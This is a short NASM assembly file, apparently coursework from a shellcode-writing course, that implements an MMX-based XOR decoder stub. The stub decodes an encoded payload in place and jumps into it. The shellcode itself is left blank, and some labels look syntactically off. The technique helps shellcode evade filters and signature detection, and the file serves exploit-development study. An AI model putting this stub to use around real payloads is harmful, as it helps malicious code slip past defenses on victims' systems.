; File: mmx-xor-decoder.nasm
; Author: Kevin Ren, originally Professor Viviek of SLAE
; Purpose: to demostrate a xor decoder using mmx registers/instruction sets

; NOTE: mmx instruction set moves data in 8 bytes/qword


global _start

section .text
_start: 
	jmp short call_decoder

decoder:				; setup for decoding
	pop edi				; decoder-value address popped into edi
	lea esi, [edi + 8]		; encoded shellcode address loaded into esi
	xor ecx, ecx
	mov cl, 4			; mmx instruction sets move data in qword or 8 bytes
					; 25 bytes / 8 bytes per instruction <= 4 cycles of instruction
					; the leftover byte will never be reached in a success execve execution

decode:
	movq mm0, qword [edi]		; moving a qword of data from edi address to mm0 register
	movq mm1, qword [esi]		; moving a qword of shellcode from esi address to mm1

	pxor mm0, mm1			; xor 8 bytes

	movq qword [esi], mm0		; moving result back to esi for a qword replacment

	add esi, 0x8			; increment our shellcode by 8 byte offsets

	loop decode			; repeat decode ecx amount of times

	jmp short shellcode		; pass control over to decoded shellcode


call_decoder:
	call decoder 
	decoder-value: db 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa
	shellcode: db ; shellcode
